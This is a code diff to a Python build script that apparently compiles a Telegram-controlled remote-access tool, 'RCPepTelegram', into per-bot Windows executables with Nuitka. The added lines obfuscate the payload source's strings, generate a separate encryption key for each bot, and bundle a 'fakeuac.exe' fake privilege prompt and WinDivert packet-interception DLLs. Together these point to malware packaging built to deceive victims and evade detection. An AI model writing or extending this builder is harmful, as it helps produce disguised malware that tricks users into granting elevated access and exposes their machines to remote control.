@@ -17,7 +17,7 @@ from os.path import isdir, join, abspath, isfile, split as pathsplit, exists, ge
 import traceback
 import webview
 from cryptography.fernet import Fernet
-from template import html_content
+from utils import html_content, obfuscate
 
 #TODO code and strings obfuscation
 
@@ -29,7 +29,6 @@ SEND_EXECUTABLE = False
 ENCRYPTION = True
 TELEGRAM_BOT_FILE_MAX_SIZE = 30 * 1024 * 1024  # 50 MB(I put 30MB just because 50 crashed a lot)
 REPO_NAME = abspath("RCPepTelegram")
-KEY_PATH = join(REPO_NAME, "key.key")
 VENV_PATH = abspath("venv")
 PY_FILE_PATH = join(REPO_NAME, "pep2.py")
 PIP_PATH = join(VENV_PATH, "Scripts", "pip.exe")
@@ -38,10 +37,22 @@ DLLSL_PATH = join(REPO_NAME, "assets", "dlls")
 REQUIREMENTS_COMMAND = f"{PIP_PATH} install -r requirements.txt"
 PY_FILE_MARKER = "PY_FILE_MARKER"
 AUTH_FILE_MARKER = "AUTH_FILE_MARKER"
+KEY_FILE_MARKER = "KEY_FILE_MARKER"
 PYTHON_FLAGS = [
-    #"-B",
-    #"no_docstrings"
+    "no_docstrings"
 ]
+
+def dll_loading_util(dlls_path: str):
+    res = ""
+    for file in listdir(dlls_path):
+        if file.startswith("WinDivert"):
+            res += f"--include-data-file=assets/dlls/{file}=pydivert/windivert_dll/{file} "
+        else:
+            res += f"--include-data-file=assets/dlls/{file}=assets/dlls/{file} "
+
+    return res
+
+
 PYTHON_FLAGS_STRING = " ".join([f"--python-flag={flag} " for flag in PYTHON_FLAGS])
 COMPILE_COMMAND = (
     f"{PYTHON_PATH} -m nuitka {PY_FILE_MARKER} "
@@ -53,12 +64,10 @@ COMPILE_COMMAND = (
     "--include-data-dir=assets/vfx=assets/vfx "
     "--include-data-dir=assets/sfx=assets/sfx "
     "--include-data-dir=assets/model=assets/model "
-    "--include-data-file=assets/dlls/WinDivert64.dll=pydivert/windivert_dll/WinDivert.dll "
-    "--include-data-file=assets/dlls/WinDivert64.dll=pydivert/windivert_dll/WinDivert64.dll "
-    " ".join([f"--include-data-file=assets/dlls/{x}=assets/dlls/{x} " for x in listdir(DLLSL_PATH)]) + " "
+    f"{dll_loading_util(DLLSL_PATH)} "
     "--include-data-file=assets/executables/fakeuac.exe=assets/executables/fakeuac.exe "
     f"--include-data-file={AUTH_FILE_MARKER}=auth.json " +
-    ("--include-data-file=key.key=key.key " if ENCRYPTION else "")
+    (f"--include-data-file={KEY_FILE_MARKER}=key.key " if ENCRYPTION else "")
 )
 AUTHS_DIRNAME = abspath("auths")
 AUTHS_REPO_PATH = join(REPO_NAME, "auths")
@@ -210,6 +219,7 @@ def compile_worker(
         source_name = f"{bot_username}.py"
 
         if ENCRYPTION:
+            KEY_PATH = join(REPO_NAME, bot_username+".key")
             real_key = create_obfuscated_key_file(KEY_PATH)
             fernet = Fernet(real_key)
             output_queue.put(f"\nKEY FILE GENERATED FOR {bot_username}\n")
@@ -221,7 +231,14 @@ def compile_worker(
         )
         start = perf_counter()
 
-        copy_file(PY_FILE_PATH, source_name)
+        #copy_file(PY_FILE_PATH, source_name)
+        print(f"Obfuscating strings..")
+        obfuscate(
+            PY_FILE_PATH,
+            source_name,
+            obfuscate_docstrings=False,
+            debug=DEBUG)
+        print("Done obfuscating strings.")
 
         run_and_capture(REQUIREMENTS_COMMAND)
         relative_auth = join("auths", pathsplit(auth_path)[-1])
@@ -233,6 +250,7 @@ def compile_worker(
                 src_path=relative_auth,
                 dst_path=relative_auth+".enc"
             )
+            compile_cmd = compile_cmd.replace(KEY_FILE_MARKER, KEY_PATH)
         compile_cmd = compile_cmd.replace(AUTH_FILE_MARKER, relative_auth+(".enc" if ENCRYPTION else ""))
         print(f"Running: {compile_cmd}")
         rc, output = run_and_capture(compile_cmd)
